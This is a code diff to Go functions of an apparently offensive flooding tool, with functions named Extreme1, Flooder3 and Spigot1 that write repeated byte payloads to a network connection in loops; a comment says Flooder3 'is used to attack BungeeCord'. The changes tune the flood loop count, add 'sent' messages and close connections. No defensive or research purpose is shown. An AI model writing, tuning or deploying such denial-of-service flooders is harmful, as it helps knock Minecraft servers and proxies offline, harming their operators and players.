@@ -48,14 +48,18 @@ func Extreme1(data *MethodData, out net.Conn) {
 		data.zero = makeBytes(0)
 	}
 
+	fmt.Println("sent")
+
 	for i := 0; i < data.Loop; i++ {
 		out.Write(data.bytes)
 
-		for n := 0; n < 5000; n++ {
+		for n := 0; n < 1900; n++ {
 			out.Write(data.one)
 			out.Write(data.zero)
 		}
 	}
+
+	out.Close()
 }
 
 // Flooder3 is used to attack BungeeCord
@@ -76,6 +80,8 @@ func Flooder3(data *MethodData, out net.Conn) {
 			out.Write(data.zero)
 		}
 	}
+
+	out.Close()
 }
 
 // Spigot1 is for spigot o_O
@@ -86,6 +92,8 @@ func Spigot1(data *MethodData, out net.Conn) {
 		data.zero = makeBytes(0)
 	}
 
+	fmt.Println("sent")
+
 	for i := 0; i < data.Loop; i++ {
 		out.Write(data.bytes)
 
@@ -94,4 +102,6 @@ func Spigot1(data *MethodData, out net.Conn) {
 			out.Write(data.zero)
 		}
 	}
+
+	out.Close()
 }
